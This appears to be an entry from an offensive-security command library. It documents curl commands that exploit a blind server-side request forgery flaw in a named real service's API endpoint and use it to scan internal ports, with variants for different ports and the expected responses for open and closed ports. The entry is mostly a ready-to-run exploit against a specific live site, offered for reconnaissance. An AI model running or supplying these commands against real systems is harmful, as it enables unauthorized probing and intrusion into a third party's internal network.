---
id: 123e4567-e89b-12d3-a456-426614174002
name: curl-infogram-ssrf-scan
type: command
executor: bash
data: >-
  curl -b cookies.txt
  "https://infogram.com/api/web_resource/url?q=http://0:6000/"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.383Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - ssrf
  - recon
  - web
verified: false
validated: true
submitted: true
---

# curl-infogram-ssrf-scan

## Command

```bash
curl -b cookies.txt "https://infogram.com/api/web_resource/url?q=http://0:6000/"
```

## Description

This command sends an authenticated GET request to the Infogram API's vulnerable /api/web_resource/url endpoint, injecting an internal localhost URL (http://0:6000/) into the 'q' parameter to exploit Blind SSRF for port scanning. Use it after authentication to probe if internal port 6000 is open, revealing service metadata if successful.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Load session cookies from file for authentication | Yes |
| `q=http://0:6000/` | Arbitrary internal URL to force SSRF (replace port as needed) | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt "https://infogram.com/api/web_resource/url?q=http://0:80/"
```

### Advanced Usage

```bash
curl -b cookies.txt -v "https://infogram.com/api/web_resource/url?q=http://127.0.0.1:81/" | jq '.title'
```

## Expected Output

For open ports: HTTP/1.1 200 OK followed by JSON like {"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker...","url":"http://0:6000/"}. For closed ports: HTTP/1.1 404 Not Found.

## Related

- [[Related Procedure|procedures/Exploit-Blind-SSRF-for-Port-Scanning]]
